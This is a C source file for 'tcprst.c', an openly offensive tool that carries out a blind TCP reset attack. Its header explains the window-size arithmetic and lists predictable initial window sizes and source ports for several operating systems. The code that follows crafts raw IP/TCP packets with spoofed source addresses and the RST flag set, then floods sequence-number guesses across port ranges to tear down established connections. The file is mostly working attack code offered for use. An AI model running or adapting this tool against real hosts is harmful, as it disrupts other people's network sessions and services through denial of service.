/*
 * tcprst.c - DoS over TCP persistent connections
 * ----------------------------------------------
 *
 * This code requires an access to RAW socket.
 *
 * Tested with:
 * (root@osiris ~)# uname -srmp
 * Linux 2.4.26 i586 Pentium_MMX
 *
 * Basically the attack pattern is resetting established TCP connection by
 * sending suitable TCP packets with the RST (reset) flag set. The packets
 * need to have source and destination IP addresses that match the established
 * connection as well as the same source and destination TCP ports.
 * The packets required for a successful RST attack are based on the equation:
 * 2^32 / Window Size
 * Note that minimum number of packets you need to send is 2^32 / 65535.
 * For example, if the TCP stack on host A has definied a 16384 window, the
 * stack must accept any packet that has a sequence numer that falls within
 * this range as the packets may be arriving out of order. Hence, someone
 * that is performing an attack with tcprst.c doesn't have to send a RST packet
 * with every possible sequence number, instead only having to send a RST
 * packet with a sequence number from each possible window. In other words,
 * an attacker would have to send 4294967295 / 16384 = 262143 packets.
 * There's also "window scaling" TCP extension that increases the available
 * window size from 16 bits to 30 bits. Theoretically, with window scaling
 * open to the maximum range, an attacker would only have to send
 * 2^32 / 2^30 = 4 packets (that's right, only 4 spoofed packets).
 *
 * Operating System  Initial Window Size
 * -------------------------------------
 * Linux 2.4/2.6     5840
 * Linux 2.0-2.2     16384,32768
 * Windows XP        16384,64240
 * Windows 2000      64512,16384
 * Windows 9x        8192
 * *BSD              65535,32768,16384
 *
 * The only different part of attack is source port, since it varies with each
 * new TCP session. Source ports are NOT actually selected from the full 16-bit
 * (65535) range. Ports 1-1024 are reserved for privileged process (UID=0),
 * ports 49152-65535 are reserved for private system ports.
 * Currently, source port selection is rather predictable, even for the blind
 * TCP spoofing attacker. Every modern OS increments source port by 1.
 * A notable exception is OpenBSD which randomizes source ports.
 * The following char represents initial source ports (I wonder if someone
 * has knowlege about other systems - please contact with me).
 *
 * Operating System  Initial Source Port
 * -------------------------------------
 * Windows XP        1050
 * Windows 2000      1060,1038
 * Linux 2.2-2.4     1024
 * 
 * Here ends my little introduction to TCP Reset Attack. 
 * You can read more in "Slipping In The Window" technical paper.
 * And oh, BTW: there's a little script kiddie protection ;)
 * Have fun!
 * 
 * Copyright (c) 2004-2005 by Marcin Ulikowski <elceef@itsec.pl>
*/

#define _GNU_SOURCE

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <limits.h>
#include <errno.h>

#define bug(n) do { perror(n); exit(1); } while (0)
#define DEFAULTWSS 16384

static u_char packet[] = {
/* IHL    */ 0x45,
/* ToS    */ 0x00,
/* totlen */ 0x00, 0x28,
/* ID     */ 0x05, 0x39,
/* offset */ 0x00, 0x00,
/* TTL    */ 0xFF,
/* proto  */ 0x06,
/* cksum  */ 0x00, 0x00,
/* saddr  */ 0x00, 0x00, 0x00, 0x00,
/* daddr  */ 0x00, 0x00, 0x00, 0x00,

/* sport  */ 0x00, 0x00,
/* dport  */ 0x00, 0x00,
/* SEQ    */ 0x00, 0x00, 0x00, 0x00,
/* ACK    */ 0x00, 0x00, 0x00, 0x00,
/* doff   */ 0x50,
/* flags  */ 0x04,
/* WSS    */ 0x00, 0x00,
/* cksum  */ 0x00, 0x00,
/* urg    */ 0x00, 0x00
};


u_short cksum(void) {
  u_int sum = 20 + 6; /* TCP len + proto(6) */
  u_char i;
  u_char *p = packet + 20;

  for (i = 0; i < 10; i++) {
    sum += (*p << 8) + *(p+1);
    p += 2;
  }

  p = packet + 12;
  
  for (i = 0; i < 4; i++) {
    sum += (*p << 8) + *(p+1);
    p += 2;
  }

  return ~(sum + (sum >> 16));
}


void usage(char *ex) {
  printf("Usage: %s <-S src-ip> <-s src-port> <-D dst-ip> <-d dst-port>\n"
         "       [-w win-size]\n"
	 "Example: %s -S 10.0.0.1 -s 1025-1030 -D 10.0.0.2 -d 22\n", ex, ex);
  exit(1);
}


int main(int argc, char** argv) {
  static struct sockaddr_in addr;
  u_int sad, dad, seq, isn;
  int sock, count = 0, total = 0, one = 1;
  u_short sp, dp, ck, wss = DEFAULTWSS;
  u_short fromsp, tosp, fromdp, todp, source, dest, i;

  printf("tcprst.c - DoS over TCP long-time connections\n"
         "(c) Marcin Ulikowski <elceef@itsec.pl>\n");

  if (argc < 9) usage(argv[0]);

  for (i = 1; i < argc; i++) {

    if (!strcmp("-S", argv[i]) && i < argc - 1) {
      i++;
      if ((sad = inet_addr(argv[i])) == INADDR_NONE) usage(argv[0]);

    } else if (!strcmp("-s", argv[i]) && i < argc - 1) {
      i++;
      if (strchr(argv[i], '-')) sscanf(argv[i], "%hu-%hu", &fromsp, &tosp);
      else {
        fromsp = atoi(argv[i]);
        tosp = atoi(argv[i]);
      }
      if (fromsp > tosp) usage(argv[0]);

    } else if (!strcmp("-D", argv[i]) && i < argc - 1) {
      i++;
      if ((dad = inet_addr(argv[i])) == INADDR_NONE) usage(argv[0]);

    } else if (!strcmp("-d", argv[i]) && i < argc - 1) {
      i++;
      if (strchr(argv[i], '-')) sscanf(argv[i], "%hu-%hu", &fromdp, &todp);
      else {
        fromdp = atoi(argv[i]);
        todp = atoi(argv[i]);
      }
      if (fromdp > todp) usage(argv[0]);

    } else if (!strcmp("-w", argv[i]) && i < argc - 1) {
      i++;
      wss = atoi(argv[i]);
      if (!wss) usage(argv[0]);

    } else usage(argv[0]);
  }

  sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  
  if (sock < 0) bug("socket");
  
  if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, (char *)&one, sizeof(one)))
    bug("setsockopt");
    
  addr.sin_family = AF_INET;
  memcpy(&addr.sin_addr.s_addr, &dad, 4);
  memcpy(packet+12, &sad, 4);
  memcpy(packet+16, &dad, 4);

  for (source = fromsp; source <= tosp; source++) {
    memset(packet+20, 0, 2);
    sp = htons(source);
    memcpy(packet+20, &sp, 2);

    for (dest = fromdp; dest <= todp; dest++) {
      printf("%u.%u.%u.%u:%hu -> %u.%u.%u.%u:%hu (win=%hu)\n",
             packet[12], packet[13], packet[14], packet[15], source,
             packet[16], packet[17], packet[18], packet[19], dest, wss);
      memset(packet+22, 0, 2);
      dp = htons(dest);
      memcpy(packet+22, &dp, 2);
      count = 0;

      for (seq = wss; seq < UINT_MAX-wss; seq += wss) {
        isn = htonl(seq);
        memcpy(packet+24, &isn, 4);
        memset(packet+36, 0, 2);
        ck = cksum();
        ck = htons(ck);
        memcpy(packet+36, &ck, 2);
        if (sendto(sock, packet, sizeof(packet), 0, (struct sockaddr *)&addr, sizeof(struct sockaddr)) < 0) {		
			perror("sendto");
		}
        total += 40;
		count++;
        if (count == 8192) {
          count = 0;
          printf("RST counter: %u  ISN guess: %lu\n", total/40, seq);
        }
      } /* seq loop ends */
    } /* dest loop ends */
  } /* source loop ends */
  printf("Total data sent: %uKB\n", total/1024);
  close(sock);
  return 0;
}

